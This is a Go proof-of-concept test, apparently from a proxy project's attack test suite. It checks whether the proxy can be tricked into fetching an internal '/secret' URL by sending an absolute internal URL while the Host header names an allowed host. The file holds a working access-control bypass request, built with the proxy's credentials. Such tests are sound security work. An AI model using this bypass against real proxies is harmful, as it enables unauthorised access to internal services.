package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net"
	"strings"
	"time"

	"oktopus/attack-and-tests/poclib"
	"oktopus/attack-and-tests/setup"
)

func cmdRun(args []string) int {
	log.SetFlags(0)
	o, err := parseFlags(args)
	if err != nil {
		return 2
	}
	ok, err := runAttack(o)
	if err != nil {
		return 1
	}
	if ok {
		return 1
	}
	return 0
}

func runAttack(o poclib.RunOpts) (bool, error) {
	if o.ConnectMode == "tunnel" {
		log.Println("bypass: plain HTTP — режим tunnel не применим")
		return false, nil
	}
	log.Println("=== bypass: GET absolute internal URL, Host: allowed ===")
	conn, err := net.Dial("tcp", o.ProxyAddr)
	if err != nil {
		return false, err
	}
	defer conn.Close()
	token := base64.StdEncoding.EncodeToString([]byte(o.ProxyUser + ":" + o.ProxyPass))
	raw := fmt.Sprintf(
		"GET http://%s/secret HTTP/1.1\r\nHost: %s\r\nProxy-Authorization: Basic %s\r\nConnection: close\r\n\r\n",
		internalHTTP, allowedHTTP, token,
	)
	_ = conn.SetDeadline(time.Now().Add(5 * time.Second))
	if _, err := io.WriteString(conn, raw); err != nil {
		return false, err
	}
	buf, _ := io.ReadAll(conn)
	body := string(buf)
	log.Printf("bypass: %s", setup.FormatPOCHTTPResponse(parseStatus(body), body))
	if strings.Contains(body, poclib.SecretMarker) {
		return true, nil
	}
	return false, nil
}

func parseStatus(body string) int {
	if i := strings.Index(body, " "); i > 0 && strings.HasPrefix(body, "HTTP/") {
		var code int
		fmt.Sscanf(body[i+1:], "%d", &code)
		return code
	}
	return 0
}
